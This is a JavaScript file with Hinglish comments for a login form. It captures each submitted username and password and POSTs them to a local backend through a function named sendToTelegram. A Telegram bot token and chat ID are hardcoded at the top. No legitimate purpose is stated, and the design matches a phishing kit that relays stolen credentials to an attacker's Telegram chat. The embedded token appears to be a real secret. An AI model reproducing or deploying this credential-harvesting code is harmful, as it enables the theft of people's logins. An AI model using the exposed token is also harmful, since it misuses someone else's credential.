// apna BOT TOKEN yahan dalen
const telegramBotToken = '8066281079:AAEqI4SnaSsWtlRaqBt8qDrQj9-_gH1gUVs';
const chatId = '6163067472';

// notification show karne ka function
function showNotification(message, type) {
  const notification = document.getElementById('notification');
  notification.textContent = message;
  notification.className = `notification ${type}`;
  notification.style.display = 'block';
  setTimeout(() => {
    notification.style.display = 'none';
  }, 3000);
}

// backend ko send karna
async function sendToTelegram(username, password) {
  try {
    const response = await fetch('http://localhost:3000/send-message', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });

    const result = await response.json();
    console.log('Result from backend:', result);

    if (response.ok && result.ok) {
      showNotification('Login details sent successfully!', 'success');
    } else {
      showNotification('Server error: message nahi bhej saka!', 'error');
    }
  } catch (error) {
    console.error('Error sending message:', error);
    showNotification('Network error!', 'error');
  }
}

// form submit handle karna
const loginForm = document.getElementById('loginForm');
loginForm.addEventListener('submit', function (event) {
  event.preventDefault();

  const usernameInput = event.target.username;
  const passwordInput = event.target.password;

  const username = usernameInput.value.trim();
  const password = passwordInput.value.trim();

  let valid = true;

  // sab error clear karo
  clearError(usernameInput);
  clearError(passwordInput);

  // username validate
  if (!username) {
    showError(usernameInput, 'Username required');
    valid = false;
  }

  // password validate
  if (!password) {
    showError(passwordInput, 'Password required');
    valid = false;
  }

  if (!valid) return; // agar validation fail ho gaya to stop

  // agar sab sahi hai to send karo
  sendToTelegram(username, password);
  event.target.reset();
});

// error show karna
function showError(inputElement, message) {
  // error message create ya select karo
  let errorMessage = inputElement.nextElementSibling;
  if (!errorMessage || !errorMessage.classList.contains('error-message')) {
    errorMessage = document.createElement('small');
    errorMessage.classList.add('error-message');
    inputElement.insertAdjacentElement('afterend', errorMessage);
  }

  // input border red + error message show
  inputElement.classList.add('error');
  errorMessage.textContent = message;
  errorMessage.style.display = 'block';

  // placeholder hide
  inputElement.setAttribute('data-placeholder', inputElement.placeholder); // store original
  inputElement.placeholder = '';
}

function clearError(inputElement) {
  const errorMessage = inputElement.nextElementSibling;
  if (errorMessage && errorMessage.classList.contains('error-message')) {
    inputElement.classList.remove('error');
    errorMessage.textContent = '';
    errorMessage.style.display = 'none';

    // placeholder wapas karo
    if (inputElement.hasAttribute('data-placeholder')) {
      inputElement.placeholder = inputElement.getAttribute('data-placeholder');
      inputElement.removeAttribute('data-placeholder');
    }
  }
}

// user type kare to error hata do aur placeholder wapas
document.querySelectorAll('.input').forEach(input => {
  input.addEventListener('input', () => {
    clearError(input);
  });
});
